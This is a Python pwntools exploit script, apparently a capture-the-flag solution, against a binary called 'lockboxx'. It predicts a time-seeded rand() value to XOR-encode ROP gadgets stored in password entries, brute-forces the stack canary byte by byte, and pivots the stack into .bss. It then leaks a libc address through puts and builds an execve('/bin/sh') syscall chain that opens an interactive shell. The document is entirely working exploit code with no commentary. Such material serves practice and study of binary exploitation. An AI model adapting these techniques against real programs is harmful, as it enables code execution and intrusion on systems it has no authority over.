from pwn import *
import time
from ctypes import CDLL

elf = exe = ELF("./lockboxx")
libc = ELF("./libc.so.6")
glibc = CDLL("./libc.so.6")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'amd64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004017b8
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()
def gad(a, b): return ROP(a).find_gadget(b)[0]

io = start()

def upd_mast_pass(bytes):
    sla(b'>>',b'4')
    sla(b'Old Master Password:',b'1')
    smash = b'10' + cyclic(38) + bytes
    sa(b'New Master Password:',smash)

sla(b'\n',b'1')

epoch_time = int(time.time()) // 5
rand_seed = glibc.srand(epoch_time)
rand_val = glibc.rand()

for i in range(4):
    sla(">> ", "1")
    sla("ID: ", f"{i+1}")
    sla("URL: ", "asd")
    sla("Username: ", "out")
    sla("E-m@il: ", "out")
    sla("Password: ", "nullll")


rbp_pivot = elf.bss() + 0x500
pop_rdi_rbp = gad(elf, ['pop rdi', 'pop rbp', 'ret'])
leave_ret = gad(elf, ['leave', 'ret'])
ret = gad(elf, ['ret'])
pop_rsi_r15_rbp = gad(elf, ['pop rsi', 'pop r15', 'pop rbp', 'ret'])

part1 = p64(pop_rdi_rbp)
part1 += p64(elf.got['puts'])
part1 += p64(rbp_pivot)
part1 += p64(elf.plt['puts'])
out1 = b""
for i in part1:
   out1 += xor(i, p8(int(rand_val) % 256))

part2 = p64(pop_rdi_rbp)
part2 += p64(0)
out2 = b""
for i in part2:
   out2 += xor(i, p8(int(rand_val) % 256))

part3 = p64(rbp_pivot)
part3 += p64(pop_rsi_r15_rbp)
part3 += p64(rbp_pivot-0x8)
out3 = b""
for i in part3:
   out3 += xor(i, p8(int(rand_val) % 256))


part4 = p64(0)
part4 += p64(rbp_pivot)
part4 += p64(elf.sym['share_password']+39)
out4 = b''
for i in part4:
   out4 += xor(i, p8(int(rand_val) % 256))

sla(">> ", "1")
sla("ID: ", "1234")
sla("URL: ", out1[:-1])
sla("Username: ", out2[:-1])
sla("E-m@il: ", out3[:-1])
sla("Password: ", out4[:-1])


canary = b'\0'
for j in range(7):
    for i in range(1,255):
        brute = canary + i.to_bytes()
        upd_mast_pass(brute)
        rl();rl();rl(); leak = rl(); itr = rl()
        if b'stack smashing' in leak:
            continue
        else:
            canary = canary + (i.to_bytes())
            info(f"BYTE {j+1}: {i.to_bytes()}")
            break
    else:
        warn("NO BYTE FOUND")
        break    
canary = int.from_bytes(canary,byteorder="little")

log.info("Canary => %s" %hex(canary))

pause()

payload = b'10'
payload += b'a'*38
payload += p64(canary)
payload += b'a'*16
payload += p64(elf.bss() + 0x1e0)
payload += p64(leave_ret)

sla(b'>>', b'4')
sla(b'Old Master Password:', b'1')
sa(b'Set New Master Password: \n', payload)

ru("Updated Master Password.\n")
libc.address = u64(re(6).ljust(8, b'\x00')) - libc.sym['puts']
log.info("Libc => %s" % hex(libc.address))

pop_rax_rdx_leave_ret = gad(libc, ['pop rax', 'pop rdx', 'leave', 'ret'])
pop_rsi = gad(libc, ['pop rsi', 'ret'])
syscall = gad(libc, ['syscall'])

payload = p64(canary)
payload += p64(syscall)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdi_rbp)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(rbp_pivot-8)
payload += p64(pop_rax_rdx_leave_ret)
payload += p64(0x3b)
payload += p64(0)
sl(payload)

io.interactive()